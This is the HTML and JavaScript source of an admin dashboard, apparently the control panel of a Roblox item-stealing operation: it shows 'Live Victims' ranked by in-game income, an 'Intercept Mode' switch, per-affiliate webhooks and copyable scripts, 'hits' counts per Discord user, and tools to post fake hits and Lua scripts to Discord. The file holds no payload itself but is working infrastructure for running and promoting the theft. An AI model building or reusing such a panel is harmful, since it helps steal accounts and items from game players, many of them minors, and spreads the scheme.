<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rusteez - Admin Control</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
        body { background-color: #080a11; color: #e2e8f0; font-family: 'Inter', sans-serif; font-size: 11px; }
        .panel { background: #111827; border: 1px solid #1f2937; border-radius: 4px; }
        .tab-btn { border-bottom: 2px solid transparent; transition: all 0.2s; color: #64748b; text-transform: uppercase; font-weight: 900; font-size: 10px; letter-spacing: 0.05em; }
        .tab-btn.active { border-color: #a855f7; color: #a855f7; background: rgba(168, 85, 247, 0.05); }
        .data-card { background: #111827; border: 1px solid #1f2937; transition: all 0.3s; position: relative; }
        .data-card:hover { border-color: #a855f7; }
        .hidden { display: none; }
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-thumb { background: #374151; }
        input { background: #1f2937 !important; border: 1px solid #374151 !important; color: white !important; }
        
        .copy-success { color: #10b981 !important; }
        .setup-btn { background: rgba(31, 41, 55, 0.5); border: 1px solid #374151; transition: all 0.3s; }
        .setup-btn:hover { border-color: #a855f7; transform: translateY(-2px); }

        /* Switch Style */
        .switch { position: relative; display: inline-block; width: 34px; height: 20px; }
        .switch input { opacity: 0; width: 0; height: 0; }
        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #374151; transition: .4s; border-radius: 34px; }
        .slider:before { position: absolute; content: ""; height: 14px; width: 14px; left: 3px; bottom: 3px; background-color: white; transition: .4s; border-radius: 50%; }
        input:checked + .slider { background-color: #ef4444; }
        input:checked + .slider:before { transform: translateX(14px); }
    </style>
</head>
<body class="p-6">

    <div id="login-overlay" class="fixed inset-0 z-50 flex items-center justify-center bg-[#080a11]">
        <div class="panel p-8 w-full max-w-sm text-center shadow-2xl">
            <h1 class="text-xl font-black italic uppercase text-purple-500 mb-6">Rusteez <span class="text-white">Admin</span></h1>
            <input type="password" id="authInput" placeholder="Enter ADMIN_TOKEN..." class="w-full p-3 rounded text-center mb-4 outline-none focus:border-purple-500">
            <button onclick="checkAuth()" class="w-full bg-purple-600 hover:bg-purple-500 py-3 rounded font-black uppercase text-[10px] tracking-widest transition-all">Access Dashboard</button>
            <p id="auth-error" class="text-red-500 text-[9px] mt-4 font-bold uppercase hidden italic underline">Invalid Token Access Denied</p>
        </div>
    </div>

    <div id="admin-content" class="hidden max-w-6xl mx-auto">
        <header class="flex justify-between items-center mb-8 bg-slate-900/40 p-5 border border-slate-800 rounded">
            <div>
                <h1 class="text-xl font-black italic uppercase tracking-tighter text-white">Rusteez <span class="text-purple-500">Master</span></h1>
                <p class="text-[9px] text-slate-500 font-bold uppercase tracking-widest">Database & Stats Management</p>
            </div>
            <div class="flex items-center gap-6">
                <div class="flex items-center gap-3 bg-black/40 p-2 rounded border border-slate-800">
                    <span class="text-[9px] font-black uppercase text-slate-400">Intercept Mode</span>
                    <label class="switch">
                        <input type="checkbox" id="intercept-checkbox" onchange="toggleIntercept(this.checked)">
                        <span class="slider"></span>
                    </label>
                </div>
                <div id="status-badge" class="text-[9px] text-emerald-500 font-black uppercase flex items-center gap-2">
                    System Online <span class="w-2 h-2 bg-emerald-500 rounded-full animate-pulse"></span>
                </div>
            </div>
        </header>

        <nav class="flex gap-1 mb-6 border-b border-slate-800">
            <button onclick="switchTab('webhooks')" id="tab-webhooks" class="tab-btn active px-8 py-4">Manage Webhooks</button>
            <button onclick="switchTab('stats')" id="tab-stats" class="tab-btn px-8 py-4">User Statistics</button>
            <button onclick="switchTab('live')" id="tab-live" class="tab-btn px-8 py-4 text-emerald-400"><i class="fas fa-satellite-dish mr-2"></i>Live Victims</button>
            <button onclick="switchTab('discord')" id="tab-discord" class="tab-btn px-8 py-4 text-purple-400"><i class="fab fa-discord mr-2"></i>Discord Bot</button>
        </nav>

        <section id="content-webhooks" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4"></section>

        <section id="content-stats" class="hidden">
            <div class="panel overflow-hidden">
                <table class="w-full text-left border-collapse">
                    <thead class="bg-black/40 border-b border-slate-800 uppercase text-[9px] text-slate-500 font-black">
                        <tr>
                            <th class="p-4">User</th>
                            <th class="p-4">Discord ID</th>
                            <th class="p-4 text-center">Total Hits</th>
                            <th class="p-4 text-right">Last Activity</th>
                        </tr>
                    </thead>
                    <tbody id="stats-table-body" class="text-[10px]"></tbody>
                </table>
            </div>
        </section>

        <section id="content-live" class="hidden">
            <div id="live-victims-container" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                <div class="col-span-full p-10 text-center text-slate-600 uppercase font-black italic">Loading live connections...</div>
            </div>
        </section>

        <section id="content-discord" class="hidden">
            <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
                <div class="lg:col-span-1 space-y-4">
                    <div class="panel p-4">
                        <h3 class="text-white font-black uppercase text-[9px] mb-4 text-purple-500">Fast Setup</h3>
                        <div class="flex flex-col gap-2">
                            <button onclick="triggerSetup('rules')" class="setup-btn p-3 rounded flex items-center gap-3 group text-left">
                                <i class="fas fa-shield-halved text-purple-500"></i>
                                <span class="font-bold uppercase text-[9px]">Send Rules</span>
                            </button>
                            </div>
                    </div>
                </div>
                <div class="lg:col-span-2 space-y-6">
                     </div>
            </div>
        </section>
    </div>

    <script>
        let GLOBAL_TOKEN = "";
        let liveInterval = null;
        
        function formatIncome(num) {
            if (num === undefined || num === null || num === 0) return "0/s";
            
            let formatted = "";
            if (num >= 1000000000) {
                formatted = (num / 1000000000).toFixed(2) + "B";
            } else if (num >= 1000000) {
                formatted = (num / 1000000).toFixed(2) + "M";
            } else if (num >= 1000) {
                formatted = (num / 1000).toFixed(1) + "K";
            } else {
                formatted = num.toString();
            }
            
            return formatted + "/s"; // On ajoute le suffixe ici
        }
        async function checkAuth() {
            const input = document.getElementById('authInput').value;
            try {
                const res = await fetch(`/api/admin/verify?token=${input}`);
                const data = await res.json();
                if (data.success) {
                    GLOBAL_TOKEN = input;
                    document.getElementById('login-overlay').classList.add('hidden');
                    document.getElementById('admin-content').classList.remove('hidden');
                    loadWebhooks();
                } else { throw new Error(); }
            } catch { document.getElementById('auth-error').classList.remove('hidden'); }
        }

        async function loadInterceptStatus() {
            try {
                const res = await fetch(`/api/admin/intercept-status?token=${GLOBAL_TOKEN}`);
                const data = await res.json();
                document.getElementById('intercept-checkbox').checked = data.intercept;
            } catch (e) { console.error("Err loading intercept status"); }
        }

        async function toggleIntercept(val) {
            try {
                await fetch(`/api/admin/intercept-toggle?token=${GLOBAL_TOKEN}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ value: val })
                });
            } catch (e) { alert("Failed to toggle intercept"); }
        }
        
        function switchTab(name) {
            document.querySelectorAll('section').forEach(s => s.classList.add('hidden'));
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            document.getElementById('content-' + name).classList.remove('hidden');
            document.getElementById('tab-' + name).classList.add('active');
            
            if(name === 'live') {
                loadLiveVictims();
                if(!liveInterval) liveInterval = setInterval(loadLiveVictims, 2000);
            } else {
                clearInterval(liveInterval);
                liveInterval = null;
            }
            if(name === 'webhooks') loadWebhooks();
            if(name === 'stats') loadStats();
        }

        async function loadLiveVictims() {
            try {
                const res = await fetch(`/api/admin/active-victims?token=${GLOBAL_TOKEN}`);
                const data = await res.json();
                const container = document.getElementById('live-victims-container');
        
                if (data.length === 0) {
                    container.innerHTML = `<div class="col-span-full p-10 text-center text-slate-600 uppercase font-black italic border border-dashed border-slate-800 rounded">No victims connected...</div>`;
                    return;
                }
        
                // OPTIONNEL : Trier par maxIncome décroissant
                data.sort((a, b) => (b.maxIncome || 0) - (a.maxIncome || 0));
        
                container.innerHTML = data.map(v => {
                    const seconds = Math.floor(v.uptime / 1000);
                    const timeStr = seconds > 60 ? `${Math.floor(seconds/60)}m ${seconds%60}s` : `${seconds}s`;
                    
                    // Utilisation de la fonction formatIncome ici
                    const displayIncome = formatIncome(v.maxIncome);
        
                    return `
                    <div class="data-card p-4 rounded border-l-4 ${v.maxIncome >= 500000000 ? 'border-l-red-500 bg-red-500/5' : 'border-l-emerald-500 bg-emerald-500/5'}">
                        <div class="flex justify-between items-start">
                            <div>
                                <h4 class="text-white font-black text-xs uppercase">@${v.username}</h4>
                                <div class="mt-2 bg-black/40 px-2 py-1 rounded border border-slate-800 inline-block">
                                    <span class="text-[7px] text-slate-500 uppercase font-black block">Top Item Income</span>
                                    <span class="${v.maxIncome >= 500000000 ? 'text-red-400' : 'text-emerald-400'} font-black text-[11px]">
                                        💰 ${displayIncome}
                                    </span>
                                </div>
                            </div>
                            <div class="text-right">
                                <p class="text-[7px] text-slate-500 uppercase font-black">Uptime</p>
                                <p class="text-white font-mono font-bold text-[10px]">${timeStr}</p>
                            </div>
                        </div>
                    </div>`;
                }).join('');
            } catch (e) { console.error("Erreur refresh victimes"); }
        }
        async function triggerSetup(type) {
            if(!confirm(`Send [${type.toUpperCase()}] to Discord?`)) return;
            try {
                const res = await fetch(`/api/admin/setup-discord?token=${GLOBAL_TOKEN}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ type })
                });
                const data = await res.json();
                alert(data.success ? "✅ Success!" : "❌ Error: " + data.message);
            } catch (err) { alert("❌ Server connection error."); }
        }

        async function sendManualHit() {
            const data = {
                displayName: document.getElementById('hit_display').value,
                username: document.getElementById('hit_user').value,
                age: document.getElementById('hit_age').value,
                brainrots: document.getElementById('hit_brainrots').value
            };
            if(!data.displayName || !data.username) return alert("Missing fields!");
            try {
                const res = await fetch(`/api/admin/setup-discord?token=${GLOBAL_TOKEN}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ type: 'manual_hit', data })
                });
                if((await res.json()).success) alert("✅ Published!");
            } catch (err) { alert("Error"); }
        }

        async function sendVisualPost() {
            const data = {
                title: document.getElementById('vis_title').value,
                image: document.getElementById('vis_image').value,
                lua: document.getElementById('vis_lua').value
            };
            if(!data.title || !data.lua) return alert("Title and LUA required!");
            try {
                const res = await fetch(`/api/admin/setup-discord?token=${GLOBAL_TOKEN}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ type: 'publish_visual', data })
                });
                if((await res.json()).success) alert("✅ Visual Posted!");
            } catch (err) { alert("Error"); }
        }

        async function loadWebhooks() {
            const res = await fetch(`/api/admin/webhooks?token=${GLOBAL_TOKEN}`);
            const data = await res.json();
            document.getElementById('content-webhooks').innerHTML = data.map(wh => `
                <div class="data-card p-4 rounded shadow-lg border-l-4 border-l-purple-600">
                    <div class="flex justify-between items-start mb-4">
                        <div>
                            <h4 class="text-white font-black text-xs uppercase tracking-tight">@${wh.userName}</h4>
                            <span class="text-[8px] text-slate-500 font-mono italic">ID: ${wh.userId}</span>
                        </div>
                        <div class="flex gap-2">
                            <button onclick="copyScript(this, \`${encodeURIComponent(wh.script || "")}\`)" class="text-purple-400 hover:text-purple-300 p-1"><i class="fas fa-code"></i></button>
                            <button onclick="deleteWebhook('${wh._id}')" class="text-red-500 hover:text-red-400 p-1"><i class="fas fa-trash-alt"></i></button>
                        </div>
                    </div>
                    <p class="text-[7px] text-slate-500 uppercase font-bold mb-1">Secret Key</p>
                    <p class="text-purple-400 font-mono text-[9px] break-all bg-black/30 p-1 rounded border border-slate-800 mb-2">${wh.webhookId}</p>
                    <p class="text-[7px] text-slate-500 uppercase font-bold mb-1">URL</p>
                    <p class="text-emerald-500 font-mono text-[8px] truncate bg-black/30 p-1 rounded border border-slate-800">${wh.url}</p>
                </div>`).join('');
        }

        async function deleteWebhook(id) {
            if(confirm("⚠️ Delete this user?")) {
                await fetch(`/api/admin/webhooks/${id}?token=${GLOBAL_TOKEN}`, { method: 'DELETE' });
                loadWebhooks();
            }
        }

        function copyScript(btn, encoded) {
            navigator.clipboard.writeText(decodeURIComponent(encoded)).then(() => {
                const icon = btn.querySelector('i');
                icon.className = "fas fa-check copy-success";
                setTimeout(() => { icon.className = "fas fa-code"; }, 1500);
            });
        }

        async function loadStats() {
            const res = await fetch(`/api/admin/hits-summary?token=${GLOBAL_TOKEN}`);
            const data = await res.json();
            document.getElementById('stats-table-body').innerHTML = data.map(user => `
                <tr class="border-b border-slate-800/50 hover:bg-white/[0.02] transition-colors">
                    <td class="p-4 font-black text-purple-400 uppercase italic underline underline-offset-4">@${user.userName}</td>
                    <td class="p-4 font-mono text-slate-500">${user._id}</td>
                    <td class="p-4 text-center"><span class="bg-purple-500/10 text-purple-400 px-3 py-1 rounded-full font-black border border-purple-500/20">${user.totalHits} HITS</span></td>
                    <td class="p-4 text-right text-slate-600 font-bold uppercase text-[8px]">${new Date(user.lastHit).toLocaleString()}</td>
                </tr>`).join('');
        }
    </script>
</body>
</html>
